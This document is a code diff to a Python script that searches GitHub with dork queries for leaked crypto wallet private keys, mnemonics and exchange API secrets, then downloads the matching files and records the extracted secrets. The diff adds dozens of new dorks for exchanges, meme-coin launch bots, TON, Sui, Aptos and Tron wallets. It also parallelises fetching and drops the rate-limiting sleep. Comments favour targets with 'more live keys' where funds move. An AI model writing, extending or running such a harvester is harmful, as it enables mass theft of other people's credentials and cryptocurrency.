@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 import requests, json, time, re, os, sys
 from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 TOKEN = os.environ.get('GH_TOKEN', '')
 if not TOKEN:
@@ -292,6 +293,88 @@ DORKS = [
     'filename:*.yml PRIVATE_KEY 0x',
     'filename:*.yaml AWS_SECRET_ACCESS_KEY',
     'filename:*.yml BINANCE_SECRET',
+
+    # === MISSING EXCHANGES — Coinbase, Bittrex, Hyperliquid, dYdX ===
+    'filename:.env COINBASE_API_KEY',
+    'filename:.env COINBASE_API_SECRET',
+    'filename:.env COINBASE_ACCESS_TOKEN',
+    'filename:.env BITTREX_API_KEY',
+    'filename:.env BITTREX_SECRET',
+    'filename:.env DYDX_API_KEY',
+    'filename:.env DYDX_STARK_PRIVATE_KEY',
+    'filename:.env HYPERLIQUID_PRIVATE_KEY',
+    'filename:.env HYPERLIQUID_API_WALLET',
+    'filename:.env PHEMEX_API_KEY',
+    'filename:.env PHEMEX_API_SECRET',
+    'filename:.env BITMEX_API_KEY',
+    'filename:.env BITMEX_API_SECRET',
+    'filename:.env WHITEBIT_API_KEY',
+    'filename:.env GATEIO_API_KEY',
+    'filename:.env GATEIO_SECRET_KEY',
+
+    # === PUMP.FUN / BUNDLE / LAUNCH BOT PATTERNS (2024-2025) ===
+    'filename:.env BUNDLE_WALLET PRIVATE_KEY',
+    'filename:.env LAUNCH_WALLET',
+    'filename:.env DEV_WALLET solana',
+    'filename:.env CREATOR_WALLET',
+    'filename:.env PUMP_PRIVATE_KEY',
+    'filename:bundle.ts PRIVATE_KEY',
+    'filename:launch.ts PRIVATE_KEY',
+    'filename:createToken.ts PRIVATE_KEY',
+    'filename:buyToken.ts PRIVATE_KEY',
+
+    # === .env.development / .env.staging — devs forget these aren't gitignored ===
+    'filename:.env.development PRIVATE_KEY',
+    'filename:.env.staging PRIVATE_KEY',
+    'filename:.env.dev PRIVATE_KEY',
+    'filename:.env.test PRIVATE_KEY 0x',
+    'filename:.env.staging BINANCE',
+    'filename:.env.development SOLANA',
+
+    # === CONFIG FILES devs forget are committing secrets ===
+    'filename:config.toml private_key',
+    'filename:settings.json private_key',
+    'filename:appsettings.json ConnectionStrings',
+    'filename:application.properties api.secret',
+    'filename:.env.local SOLANA_PRIVATE_KEY',
+
+    # === TELEGRAM MINI-APP / TON BOTS — 2024 pattern ===
+    'filename:.env TON_MNEMONIC 24',
+    'filename:.env TON_PRIVATE_KEY',
+    'filename:bot.py TON_WALLET MNEMONIC',
+    'filename:.env TONKEEPER_MNEMONIC',
+
+    # === SUI / APTOS — less saturated, more live keys ===
+    'filename:.env SUI_PRIVATE_KEY',
+    'filename:.env SUI_MNEMONIC',
+    'filename:.env APTOS_PRIVATE_KEY',
+    'filename:.env APTOS_MNEMONIC',
+    'filename:Move.toml private_key',
+
+    # === TRON — still active, TRC20 USDT moves here ===
+    'filename:.env TRON_PRIVATE_KEY',
+    'filename:.env TRONWEB_PRIVATE_KEY',
+    'filename:.env TRON_API_KEY',
+    'filename:tron.py private_key',
+
+    # === BROWSER EXTENSION WALLETS exported to files ===
+    'filename:phantom.json secretKey',
+    'filename:metamask_export.json mnemonic',
+    'filename:wallet_export.json mnemonic',
+    'filename:keystore password',
+
+    # === NFT MARKETPLACE BOTS (2023-2024) ===
+    'filename:.env OPENSEA_API_KEY PRIVATE_KEY',
+    'filename:.env BLUR_API_KEY PRIVATE_KEY',
+    'filename:nft_bot.py PRIVATE_KEY',
+    'filename:mint.ts PRIVATE_KEY mainnet',
+
+    # === CROSS-CHAIN BRIDGE / ARBITRAGE BOTS ===
+    'filename:.env CROSS_CHAIN_PRIVATE_KEY',
+    'filename:.env BRIDGE_BOT PRIVATE_KEY',
+    'filename:.env CHAIN_A_PRIVATE_KEY',
+    'filename:.env CHAIN_B_PRIVATE_KEY',
+    'filename:arb.ts PRIVATE_KEY rpc',
 ]
 
 # load seen set
@@ -321,6 +404,19 @@ def get_raw(url):
     r = requests.get(raw, headers=HEADERS, timeout=10)
     return r.text[:8000] if r.status_code == 200 else ''
 
+def fetch_and_scan(item):
+    html_url = item.get('html_url', '')
+    repo = item.get('repository', {}).get('full_name', '')
+    path = item.get('path', '')
+    try:
+        content = get_raw(html_url)
+    except:
+        content = ''
+    secrets = []
+    if content:
+        secrets = list(set(m.group(0)[:200] for m in KEY_RE.finditer(content)))
+    return html_url, repo, path, secrets
+
 findings = []
 new_seen = []
 
@@ -337,42 +433,38 @@ for dork in DORKS:
         if not items:
             break
 
-        new_items = 0
+        # pre-filter to unseen items only
+        new_items_list = []
         for item in items:
-            html_url = item.get('html_url', '')
             repo = item.get('repository', {}).get('full_name', '')
             path = item.get('path', '')
             key = f'{repo}/{path}'
+            if key not in seen:
+                seen.add(key)
+                new_seen.append(key)
+                new_items_list.append(item)
 
-            if key in seen:
-                continue
+        print(f'  page {page}: {len(new_items_list)} new candidates', flush=True)
 
-            new_items += 1
-            seen.add(key)
-            new_seen.append(key)
+        # parallel raw fetch — 8 workers, ~8x faster than sequential 0.2s sleeps
+        with ThreadPoolExecutor(max_workers=8) as ex:
+            futures = {ex.submit(fetch_and_scan, item): item for item in new_items_list}
+            for future in as_completed(futures):
+                try:
+                    html_url, repo, path, secrets = future.result()
+                except:
+                    continue
+                if secrets:
+                    entry = {
+                        'url': html_url,
+                        'repo': repo,
+                        'path': path,
+                        'secrets': secrets[:10],
+                        'found_at': datetime.utcnow().isoformat()
+                    }
+                    findings.append(entry)
+                    print(f'  HIT: {repo}/{path} — {len(secrets)} secrets', flush=True)
 
-            try:
-                content = get_raw(html_url)
-                time.sleep(0.2)
-            except:
-                continue
-
-            if not content:
-                continue
-
-            secrets = list(set(m.group(0)[:200] for m in KEY_RE.finditer(content)))
-            if secrets:
-                entry = {
-                    'url': html_url,
-                    'repo': repo,
-                    'path': path,
-                    'secrets': secrets[:10],
-                    'found_at': datetime.utcnow().isoformat()
-                }
-                findings.append(entry)
-                print(f'  HIT: {repo}/{path} — {len(secrets)} secrets', flush=True)
-
-        print(f'  page {page}: {new_items} new candidates', flush=True)
         if len(items) < 100:
             break
         time.sleep(2)
